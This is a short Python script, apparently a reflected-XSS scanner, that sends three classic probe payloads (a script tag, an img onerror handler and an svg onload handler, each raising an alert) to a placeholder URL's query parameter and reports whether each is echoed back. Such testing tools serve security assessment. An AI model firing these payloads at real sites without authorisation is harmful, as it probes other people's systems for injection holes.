import requests
from urllib.parse import quote

# Target URL to test for XSS vulnerability
target_url = "https://example.com/page?id="

# Payloads for testing, modify as needed
xss_payloads = [ "<script>alert('XSS')</script>", "<img src='x' onerror='alert(\"XSS\")'>", "<svg/onload=alert('XSS')>" ]

def test_xss_vulnerability(url, payload):
    # Encode the payload for URL inclusion
    encoded_payload = quote(payload)

    # Craft the complete URL with the encoded payload
    test_url = f"{url}{encoded_payload}"

    try:
        # Send a GET request to the target URL with the payload
        response = requests.get(test_url)

        # Check the response for indications of successful exploitation
        if payload in response.text:
            print(f"XSS vulnerability found! Payload: {payload}")
        else:
            print(f"No XSS vulnerability with payload: {payload}")

    except requests.RequestException as e:
        print(f"Request failed: {e}")

if __name__ == "__main__":
    # Test each payload against the target URL for XSS vulnerability
    for payload in xss_payloads:
        test_xss_vulnerability(target_url, payload)